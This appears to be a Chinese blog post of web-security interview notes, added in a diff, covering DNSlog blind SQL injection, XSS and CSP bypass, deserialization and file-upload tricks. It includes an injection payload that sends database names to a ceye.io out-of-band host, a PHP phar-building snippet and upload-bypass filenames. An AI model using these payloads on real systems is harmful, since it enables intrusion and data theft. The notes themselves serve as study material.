+<h4 id="15、DNSlog盲注"><a href="#15、DNSlog盲注" class="headerlink" title="15、DNSlog盲注"></a>15、DNSlog盲注</h4><p><a href="https://www.cnblogs.com/p0pl4r/p/10500184.html" target="_blank" rel="noopener">https://www.cnblogs.com/p0pl4r/p/10500184.html</a></p>
+<p>1、通过DNSlog盲注需要用到load_file()函数，一般是root权限</p>
+<p>secure_file_priv为null，load_file就不能加载文件。</p>
+<p>‘ and if((select load_file(concat(‘\\‘,(select database()),’.xxxxx.ceye.io\abc’))),1,0)– -+</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.XXX.ceye.io\\abc&#39;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="16、NTLM和Kerberos协议"><a href="#16、NTLM和Kerberos协议" class="headerlink" title="16、NTLM和Kerberos协议"></a>16、NTLM和Kerberos协议</h4><p>这个NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。</p>
+<p>NTLM验证是一种Challenge/Response 验证机制，由三种消息组成:通常称为type 1(协商)，类型type 2(质询)和type 3(身份验证)。</p>
+<p><a href="https://www.anquanke.com/post/id/193149#h3-6" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193149#h3-6</a></p>
+<h6 id="利用ntlm进行的信息收集："><a href="#利用ntlm进行的信息收集：" class="headerlink" title="利用ntlm进行的信息收集："></a>利用ntlm进行的信息收集：</h6><p>在type2返回Challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等。这也就意味着如果我们在能跟服务器进行ntlm 交流中，给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息。前面我们说过ntlm是一个嵌入式的协议，消息的传输依赖于使用ntlm的上层协议，比如SMB,LDAP,HTTP等。我们以SMB为例。在目标主机开放了445或者139的情况，通过给服务器发送一个type1的请求，然后解析type2的响应。就可以收集到一些信息。</p>
+<p>msf底下也有类似的模块auxiliary/scanner/smb/smb_version</p>
+<h5 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos:"></a>Kerberos:</h5><p>Kerberos是一种网络认证协议，对个人通信以安全的手段进行身份认证。其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。 它允许某实体在非安全网络环境下通信，向另一个实体以一种安全的方式证明自己的身份。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一 种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥)执行认证服务的。</p>
+<h4 id="17、CORS和jsonp"><a href="#17、CORS和jsonp" class="headerlink" title="17、CORS和jsonp"></a>17、CORS和jsonp</h4><p><a href="https://juejin.im/post/5dd1211c51882510c70668ad" target="_blank" rel="noopener">https://juejin.im/post/5dd1211c51882510c70668ad</a></p>
+<p>Jsonp(JSON with Padding) 是 json 的一种”使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。跨域请求资源的解决方案，JSONP可以绕过AJAX遵循的同源策略。</p>
+<p>因为浏览器有同源策略的限制，像test1.sec.com和test2.sec.com是无法之间通信的，但是 调用js文件，却不受同源的影响，并且src属性引入的文件都不受同源的限制，这也是同源策略留下的一个后门，为了方便</p>
+<h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><p>JSONP原理就是动态插入带有跨域url的<code>/scrpit</code>标签，然后调用回调函数，把我们需要的json数据作为参数传入，通过一些逻辑把数据显示在页面上。</p>
+<p><a href="https://xz.aliyun.com/t/2745#toc-15" target="_blank" rel="noopener">https://xz.aliyun.com/t/2745#toc-15</a></p>
+<p><a href="https://xz.aliyun.com/t/5143" target="_blank" rel="noopener">https://xz.aliyun.com/t/5143</a></p>
+<p><a href="https://juejin.im/post/5dd1211c51882510c70668ad" target="_blank" rel="noopener">https://juejin.im/post/5dd1211c51882510c70668ad</a></p>
+<p>CORS：是能够帮助Web浏览器以受控方式使用<code>XMLHttpRequest</code> API执行跨域请求的一种机制。这种跨域请求中包含一个<code>Origin</code>头，可以用来标识发起该请求的所属域。CORS定义了在Web浏览器和服务端之间使用的一种协议，可以确定是否允许跨域请求。</p>
+<h4 id="19、XSS绕waf"><a href="#19、XSS绕waf" class="headerlink" title="19、XSS绕waf"></a>19、XSS绕waf</h4><p>0x01、弹窗关键字检测绕过</p>
+<p>0x02、编码绕过</p>
+<p>0x03、引入外部JS</p>
+<p>一些事件处理程序没有在黑名单中：</p>
+<p>onauxclick ondblclick oncontextmenu onmouseleave ontouchcancel </p>
+<p>黑名单中缺少事件处理程序和函数调用混淆</p>
+<p>利用各种各样的 on 事件 </p>
+<p>编码转换（ json.loads解码时，会将\uxxxx转化，利用类似特性可以用 unicode、url、html等编码绕过防护。）</p>
+<h4 id="20、常用CSP绕过？"><a href="#20、常用CSP绕过？" class="headerlink" title="20、常用CSP绕过？"></a>20、常用CSP绕过？</h4><p>1、利用jsonp接口</p>
+<p>2、302跳转</p>
+<p>3、利用任意文件上传</p>
+<p>4、RPO</p>
+<p>5、iframe绕过</p>
+<p>6、cdn绕过</p>
+<p>7、svg绕过</p>
+<p>RPO（相对路径覆盖）是一种通过覆盖目标文件来利用相对URL的技术。</p>
+<h4 id="21、mysql普通用户能不能写shell"><a href="#21、mysql普通用户能不能写shell" class="headerlink" title="21、mysql普通用户能不能写shell"></a>21、mysql普通用户能不能写shell</h4><p>secure_file_priv为null且为root才能够写、不然root也写不了</p>
+<h4 id="22、注入常用报错函数"><a href="#22、注入常用报错函数" class="headerlink" title="22、注入常用报错函数"></a>22、注入常用报错函数</h4><p>常用的报错函数 <a href="https://xz.aliyun.com/t/253#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/253#toc-3</a></p>
+<p>floor、UpdateXmal、ExtractValue、NAME_CONST, Erro based Double Query Injection multipoint()、geometrycollection()、polygon()、multipolygon()等方法   -&gt; XPATH语法错误等等</p>
+<h4 id="23、反序列化"><a href="#23、反序列化" class="headerlink" title="23、反序列化"></a>23、反序列化</h4><p>把内存中的一个对象，通过某种方式，变成可以用于保存/互联网传输的字<br>符串，被称为序列化。反之，从对应字符串还原成内存中的对象，则是反序列化。<br>如果语言提供从任意对象和任意字符串互相转化的功能，且被转化出的对象，在转化方法中会执行高危代码，就有可能出现反序列化漏洞。</p>
+<p>几个魔法函数：</p>
+<figure class="highlight plain"><figcaption><span>构造函数每次创建对象都会调用此方法</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;__destruct&#96;&#96;&#96; 某个对象引用被删除和对象被销毁时执行</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;__wakeupunserialize()&#96;&#96;&#96; 检查是否存在wakeup()方法，如果存在调用</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;__toString&#96;&#96;&#96; 一个对象被当字符串使用执行这个对象的&#96;&#96;&#96;__tostring</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><figcaption><span>字符串或对象被序列化，属性不修改，不执行。当序列化字符串属性个数的值大于真实个数的属性时会跳过__wakeup的执行，反序列化时会执行</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​	**PHP反序列化** **– Session**</span><br><span class="line"></span><br><span class="line">​		常规：写文件到PHP Session &#x2F; 把什么东西给写到Session去</span><br><span class="line"></span><br><span class="line">​		PHP Session有两种序列化&#x2F;反序列化方式</span><br><span class="line"></span><br><span class="line">​	**PHP反序列化 – Phar**</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">$phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;?php __HALT_CONPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata(序列化数据);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<p>​        通过文件上传将phar上传到服务器上</p>
+<p>​        使用file_get_contents(‘phar://文件路径/test.php’)即可触发反序列化漏洞。</p>
+<p>​        所有的文件系统函数都可以触发</p>
+<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
+<h5 id="寻找POP链"><a href="#寻找POP链" class="headerlink" title="寻找POP链"></a>寻找POP链</h5><p>• ROP （Return-Oriented Programing） ：面向返回编程。</p>
+<p>• POP （Property-Oriented Programing）：面向属性编程。</p>
+<p>• 从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一</p>
+<p>组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调</p>
+<p>用链来执行一些操作。</p>
+<p>• 从可能的高危函数点出发，反向倒推反序列化链。</p>
+<h5 id="PHP反序列化-–-POP"><a href="#PHP反序列化-–-POP" class="headerlink" title="PHP反序列化 – POP"></a><strong>PHP</strong>反序列化 <strong>– POP</strong></h5><p>​    • 一般的反序列化攻击，漏洞点通常都在<strong>PHP魔术方法</strong>中。</p>
+<p>​    • 如果关键代码没在魔法方法中，而是在一个类的普通方法中：</p>
+<p>​        • 找到哪个类的哪个函数会调用其成员的普通方法，不需要纠结其成员是哪个类，只需确保方法名相同、函数签名兼容：</p>
+<p>​            $this-&gt;aa-&gt;someMethod();</p>
+<p>​    • 如果在反序列化之后，能直接调用那个函数，就完成</p>
+<p>​    • 如果不能直接调用，那就重复1 2 步 一直到找到为止。</p>
+<p>• 当__wakeup里被加入了限制代码：</p>
+<p>• CVE-2016-7124</p>
+<p>• 当没有任何类可以利用</p>
+<p>• PHP自带的SoapClient类，SSRF</p>
+<p>• 当某些成员必须相等</p>
+<p>• 使用引用：$this-&gt;xxx = &amp;$this-&gt;yyy</p>
+<p>• 学习文章</p>
+<p>• <a href="https://xz.aliyun.com/t/3674" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674</a></p>
+<h5 id="python反序列"><a href="#python反序列" class="headerlink" title="python反序列"></a>python反序列</h5><p>• Python反序列化：如果import pickle，大概率就是反序列化题目。</p>
+<p>• 一般搭配Cookies伪造等使用。</p>
+<p>• CTF：HITB-XCTF 2018 — Python’s Revenge (Web)</p>
+<p>• 学习文章：</p>
+<p>• <a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+<p>• <a href="https://xz.aliyun.com/t/2289" target="_blank" rel="noopener">https://xz.aliyun.com/t/2289</a></p>
+<h5 id="java反序列"><a href="#java反序列" class="headerlink" title="java反序列"></a>java反序列</h5><p>• Java反序列化：注意xxx.readObject();，遇到就说明大概率是反序列化题。</p>
+<p>• 大部分题目都可用ysoserial生成payload直接打，只需要注意项目内有</p>
+<p>哪些库即可。</p>
+<p>• <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
+<p>• CTF：0CTF 2019 Final Wallbreaker (not very) Hard</p>
+<p>• CTF：强网杯2018初赛：彩蛋</p>
+<p>• <a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp" target="_blank" rel="noopener">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp</a></p>
+<p>gadget.html?m=1</p>
+<h4 id="24、文件上传的姿势"><a href="#24、文件上传的姿势" class="headerlink" title="24、文件上传的姿势"></a>24、文件上传的姿势</h4><p>1、客户端的javascript检验</p>
+<p>2、服务端检验：文件头content-type字段、文件内容头、黑名单等</p>
+<p>3、配合文件包含</p>
+<p>4、服务器解析漏洞</p>
+<p>1、IIS5-IIS6</p>
+<p>IIS6 目录解析：http:/xxx/test.asp/xxx.jpg</p>
+<p>服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p>
+<p>文件解析： 利用分号截断 xxx.asp;.jpg</p>
+<p>IIS7.5：test.jpg/.php</p>
+<p>除了asp还包含 asa,cer,cdx</p>
+<p>IIS的PUT上传：PUT是在WebDav中定义的一个方法，允许用户上传文件到指</p>
+<p>定目录。在许多WebServer中都默认禁用了此方法，或者对上传做了严</p>
+<p>格限制。但在IIS中，如果目录支持写权限，同时开启了</p>
+<p>WebDav，就会支持PUT，再结合MOVE方法，可Getshell。</p>
+<p>5、apache解析漏洞</p>
+<p>原理是从右到左开始判断 一直到找到认识的后缀</p>
+<p><a href="http://www.xxxx.xxx.com/test.php.php123" target="_blank" rel="noopener">/test.php.php123</a></p>
+<p>6、nginx解析漏洞</p>
+<h4 id="25、给你一个API如何测试："><a href="#25、给你一个API如何测试：" class="headerlink" title="25、给你一个API如何测试："></a>25、给你一个API如何测试：</h4><p><a href="https://xz.aliyun.com/t/2412#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/2412#toc-11</a></p>
+<p>1、逻辑越权：通过修改或者猜测参数</p>
+<p>2、输入控制类： XXE、注入、XSS</p>
+<p>3、接口滥用：爆破、遍历、 如验证码爆破、登陆爆破、手机号、身份证遍历等</p>
+<p>4、信息泄露：如越权导致的信息泄露</p>
+<p>5、http响应控制：发送 <code>Content-Security-Policy: default-src &#39;none&#39;</code> 头。等</p>
+<p>6、服务器端配置漏洞</p>
+<h4 id="26、GPC是什么？GPC之后怎么绕过？"><a href="#26、GPC是什么？GPC之后怎么绕过？" class="headerlink" title="26、GPC是什么？GPC之后怎么绕过？"></a>26、<strong>GPC是什么？GPC之后怎么绕过？</strong></h4><p>1、<strong>二次urldecode注入</strong></p>
+<p><strong>2、</strong>通过数据库（文本）中转</p>
+<p>3、通过编码</p>
+<p>4、一些函数的错误处理</p>
+<p>5、字符串和数组</p>
+<p>6、PHP自身的一些缺陷</p>
+<h4 id="python如何去重"><a href="#python如何去重" class="headerlink" title="python如何去重"></a>python如何去重</h4><p>​    1、列表list 写直接的方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">old_list = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">new_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> old_list:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> new_list:</span><br><span class="line">        new_list.append(i)</span><br><span class="line">print(new_list) <span class="comment"># [2, 3, 4, 5, 1]</span></span><br></pre></td></tr></table></figure>
+
+<p>​    2、用字典dict去重：使用list项作为键创建dict，这将自动删除任何重复项，因为dict不能有重复的键，保留原顺序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">old_list &#x3D; [2, 3, 4, 5, 1, 2, 3]</span><br><span class="line">new_list &#x3D; list(dict.fromkeys(old_list))</span><br><span class="line">print(new_list) # [2, 3, 4, 5, 1]</span><br></pre></td></tr></table></figure>
+
+<p>​    3、用集合set去重：将list转化为set再转化为list，利用set的自动去重功能，但不保证顺序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">old_list &#x3D; [2, 3, 4, 5, 1, 2, 3]</span><br><span class="line">new_list &#x3D; list(set(old_list))</span><br><span class="line">print(new_list) # 不保证顺序：[1, 2, 3, 4, 5]</span><br></pre></td></tr></table></figure>
+
+<p>​    再加上列表中索引（index）的方法保证去重后的顺序不变。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">old_list &#x3D; [2, 3, 4, 5, 1, 2, 3]</span><br><span class="line">new_list &#x3D; list(set(old_list))</span><br><span class="line">new_list.sort(key&#x3D;old_list.index)</span><br><span class="line">print(new_list) # 保留顺序：[2, 3, 4, 5, 1]</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="DDOS攻击和cc攻击"><a href="#DDOS攻击和cc攻击" class="headerlink" title="DDOS攻击和cc攻击"></a>DDOS攻击和cc攻击</h4><p>​    cc攻击是DDos攻击的其中一种，而DDos攻击方式还有：ICMP Flood、UDP Flood、NTP Flood等</p>
+<p>​    CC攻击是目前应用层攻击的主要手段之一，借助代理服务器生成指向目标系统的合法请求，实习伪装和DDos。访问的人越多，数据库压力就越大，被访问的频率也越高，占用的系统资源就越可观。</p>
+<p>​    CC攻击模拟多个正常用户不停地访问，造成服务器资源的浪费，CPU长时间处于100%，永远都有处理不完的请求，网络拥塞，正常访问被终止。这种攻击技术性含量高，见不到真实源IP，见不到特别大的异常流量，但服务器就是无法进行正常连接。</p>
+<p>​    CC攻击是针对web服务在第七层协议发起的攻击，在越上层协议上发动DDos攻击越难以防护，因为上层协议与业务关联越加紧密，防御系统面临的情况也会更复杂。</p>
+<p>​    CC攻击最重要的方式之一HTTP Flood，不仅会直接导致被攻击的web前端响应缓慢，对承载的业务造成致命的影响，还可能会引起连锁反应，间接攻击到后端的Java等业务层逻辑以及更后端的数据库服务。</p>
+<p>​    购买高仿服务器、购买高防CDN服务。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/24/Laravel-5-8x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="Laravel 5.8x 反序列化">
+      <i class="fa fa-chevron-left"></i> Laravel 5.8x 反序列化
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/07/windows%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE/" rel="next" title="windows身份认证协议">
+      windows身份认证协议 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">1.</span> <span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、PHP特性、7-2特性"><span class="nav-number">1.0.1.</span> <span class="nav-text">1、PHP特性、7.2特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、Mysql5-7的特性"><span class="nav-number">1.0.2.</span> <span class="nav-text">2、Mysql5.7的特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、前端LocalStorage、SessionStorage"><span class="nav-number">1.0.3.</span> <span class="nav-text">3、前端LocalStorage、SessionStorage</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#LocalStorage："><span class="nav-number">1.0.3.1.</span> <span class="nav-text">LocalStorage：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SessionStorage："><span class="nav-number">1.0.3.2.</span> <span class="nav-text">SessionStorage：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、SQL注入"><span class="nav-number">1.0.4.</span> <span class="nav-text">4、SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1、between注入："><span class="nav-number">1.0.4.1.</span> <span class="nav-text">1、between注入：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-www-anquanke-com-post-id-158674"><span class="nav-number">1.0.4.2.</span> <span class="nav-text">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;158674</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2、order-by注入-https-www-anquanke-com-post-id-158674"><span class="nav-number">1.0.4.3.</span> <span class="nav-text">2、order by注入: https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;158674</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3、limit-注入："><span class="nav-number">1.0.4.4.</span> <span class="nav-text">3、limit 注入：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4、Mysql报错注入"><span class="nav-number">1.0.4.5.</span> <span class="nav-text">4、Mysql报错注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Mysql时间盲注"><span class="nav-number">1.0.4.6.</span> <span class="nav-text">Mysql时间盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SQL注入绕过"><span class="nav-number">1.0.4.7.</span> <span class="nav-text">SQL注入绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、本地包含RCE"><span class="nav-number">1.0.5.</span> <span class="nav-text">4、本地包含RCE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5、IIS短文件名漏洞原理"><span class="nav-number">1.0.6.</span> <span class="nav-text">5、IIS短文件名漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6、SSRF无回显如何利用"><span class="nav-number">1.0.7.</span> <span class="nav-text">6、SSRF无回显如何利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#4、ssrf攻击内网redis"><span class="nav-number">1.0.7.1.</span> <span class="nav-text">4、ssrf攻击内网redis</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7、http-only绕过"><span class="nav-number">1.0.8.</span> <span class="nav-text">7、http-only绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8、mysql提权方法"><span class="nav-number">1.0.9.</span> <span class="nav-text">8、mysql提权方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9、前端中的跨域"><span class="nav-number">1.0.10.</span> <span class="nav-text">9、前端中的跨域</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10、HQL注入"><span class="nav-number">1.0.11.</span> <span class="nav-text">10、HQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SQLserver执行命令"><span class="nav-number">1.0.11.1.</span> <span class="nav-text">SQLserver执行命令</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#11、Redis在windows下getshell"><span class="nav-number">1.0.12.</span> <span class="nav-text">11、Redis在windows下getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12、phpadmin-getshell"><span class="nav-number">1.0.13.</span> <span class="nav-text">12、phpadmin getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13、cookie的same-site"><span class="nav-number">1.0.14.</span> <span class="nav-text">13、cookie的same-site</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SameSite-Strict-、Lax"><span class="nav-number">1.0.14.1.</span> <span class="nav-text">SameSite &#x3D; Strict 、Lax</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#14、XXE"><span class="nav-number">1.0.15.</span> <span class="nav-text">14、XXE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#15、DNSlog盲注"><span class="nav-number">1.0.16.</span> <span class="nav-text">15、DNSlog盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#16、NTLM和Kerberos协议"><span class="nav-number">1.0.17.</span> <span class="nav-text">16、NTLM和Kerberos协议</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#利用ntlm进行的信息收集："><span class="nav-number">1.0.17.0.1.</span> <span class="nav-text">利用ntlm进行的信息收集：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Kerberos"><span class="nav-number">1.0.17.1.</span> <span class="nav-text">Kerberos:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#17、CORS和jsonp"><span class="nav-number">1.0.18.</span> <span class="nav-text">17、CORS和jsonp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#-1"><span class="nav-number">1.0.19.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#19、XSS绕waf"><span class="nav-number">1.0.20.</span> <span class="nav-text">19、XSS绕waf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#20、常用CSP绕过？"><span class="nav-number">1.0.21.</span> <span class="nav-text">20、常用CSP绕过？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#21、mysql普通用户能不能写shell"><span class="nav-number">1.0.22.</span> <span class="nav-text">21、mysql普通用户能不能写shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#22、注入常用报错函数"><span class="nav-number">1.0.23.</span> <span class="nav-text">22、注入常用报错函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#23、反序列化"><span class="nav-number">1.0.24.</span> <span class="nav-text">23、反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#寻找POP链"><span class="nav-number">1.0.24.1.</span> <span class="nav-text">寻找POP链</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PHP反序列化-–-POP"><span class="nav-number">1.0.24.2.</span> <span class="nav-text">PHP反序列化 – POP</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#python反序列"><span class="nav-number">1.0.24.3.</span> <span class="nav-text">python反序列</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#java反序列"><span class="nav-number">1.0.24.4.</span> <span class="nav-text">java反序列</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#24、文件上传的姿势"><span class="nav-number">1.0.25.</span> <span class="nav-text">24、文件上传的姿势</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#25、给你一个API如何测试："><span class="nav-number">1.0.26.</span> <span class="nav-text">25、给你一个API如何测试：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#26、GPC是什么？GPC之后怎么绕过？"><span class="nav-number">1.0.27.</span> <span class="nav-text">26、GPC是什么？GPC之后怎么绕过？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python如何去重"><span class="nav-number">1.0.28.</span> <span class="nav-text">python如何去重</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DDOS攻击和cc攻击"><span class="nav-number">1.0.29.</span> <span class="nav-text">DDOS攻击和cc攻击</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baishuo"
+      src="/images/baishuo.jpg">
+  <p class="site-author-name" itemprop="name">baishuo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">baishuo</span>
+</div>
